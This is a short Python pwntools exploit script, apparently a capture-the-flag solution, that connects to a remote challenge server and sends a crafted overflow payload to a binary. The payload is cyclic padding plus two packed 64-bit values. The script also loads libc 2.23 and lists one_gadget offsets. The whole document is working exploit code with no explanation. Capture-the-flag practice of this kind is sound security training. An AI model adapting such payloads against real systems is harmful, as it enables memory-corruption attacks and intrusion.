from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29278)
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
ru = lambda x: io.recvuntil(x)
rud = lambda x: io.recvuntil(x, drop=True)

sla(b'But Whether it starts depends on you.\n', cyclic(0x18) + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A))
io.interactive()
